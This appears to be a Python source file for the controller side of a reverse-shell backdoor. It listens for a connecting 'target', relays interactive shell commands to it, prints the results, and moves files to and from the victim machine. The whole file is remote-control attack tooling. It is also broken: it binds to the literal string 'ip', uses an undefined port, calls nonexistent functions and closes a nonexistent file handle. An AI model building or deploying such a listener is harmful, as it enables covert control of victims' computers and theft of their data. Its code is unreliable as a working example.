import socket
import json
import os


class Server:

    def __init__(self,ip,port):
        server = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        server.bind(('ip', port))
        server.listen(1)
        print('[+] Listen for the Incoming Connection ')
        self.target, self.ip = server.accept()
        print('[+] Target Connected from: ' + str(self.ip))





    def reliable_send(self,data):
        jsondata = json.dumps(data)
        self.target.send(jsondata.encode())

    def reliable_recv(self):
        data = ''
        while True:
            try:
                data = data + self.target.recv(1024).decode().rstrip()
                return  json.loads(data)
            except ValueError:
                continue

    def upload_file(self,file_name):
        f = open(file_name, 'rb')
        self.target.send(f.read())

    def download_file(self,file_name):
        f = open(file_name, 'wb')
        self.target.settimeout(1)
        chunk = self.target.recv(1024)
        while chunk:
            f.write(chunk)
            try:
                chunk = self.target.recv(1024)
            except socket.timeout as e:
                break
        self.target.settimeout(None)
        self.f.close()

    def target_communication(self):
        while True:
            command = input('[+] Shell~%s: ' % str(self.ip))
            self.reliable_send(command)

            if command == 'quite':
                break
            elif command == 'clear':
                os.system('clear')
            elif command [:3] == 'cd ':
                pass
            elif command [:8] == 'download':
                download.file(command[9:])
            elif command [:6] == 'upload':
                upload_file(command[7:])

            else:
                result = self.reliable_recv()
                print(result)


my_server = Server('ip',port)
my_server.target_communication()





